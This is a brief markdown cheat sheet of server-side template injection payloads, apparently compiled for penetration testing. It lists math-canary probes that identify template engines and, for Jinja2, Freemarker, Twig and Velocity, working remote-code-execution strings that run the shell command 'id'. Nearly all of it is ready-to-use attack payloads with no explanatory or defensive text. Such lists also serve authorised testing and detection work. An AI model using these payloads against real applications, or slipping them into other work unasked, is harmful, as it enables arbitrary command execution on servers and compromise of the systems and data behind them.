# SSTI payload bank

## Detection (math canaries)
{{7*7}} → 49 (Jinja2/Twig)
${7*7} → 49 (Freemarker/JSP EL)
<%= 7*7 %> → 49 (ERB)
#{7*7} → 49 (Thymeleaf)
[[7*7]] → 49 (Twig)
{{7*'7'}} → 7777777 (Jinja2 string multiply)

## Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}} (find subprocess.Popen)

## Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${T(java.lang.Runtime).getRuntime().exec('id')}

## Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

## Velocity
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()
